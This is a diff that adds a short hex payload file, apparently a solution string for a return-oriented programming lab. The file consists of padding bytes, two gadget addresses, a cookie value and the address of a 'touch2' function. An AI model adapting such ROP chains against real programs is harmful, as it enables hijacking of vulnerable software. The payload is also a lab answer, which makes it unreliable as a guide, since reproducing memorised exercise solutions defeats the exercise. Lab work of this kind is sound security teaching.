@@ -1,0 +1,7 @@
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+00 00 00 00 00 00 00 00 /* padding */
+61 1d 40 00 00 00 00 00 /* gadget 1 */
+dd d2 3c 78 c3 00 00 00 /* Cookie with first 3 bytes removed */
+8b 1d 40 00 00 00 00 00 /* gadget 2 */
+a4 1b 40 00 00 00 00 00 /* touch2 address */
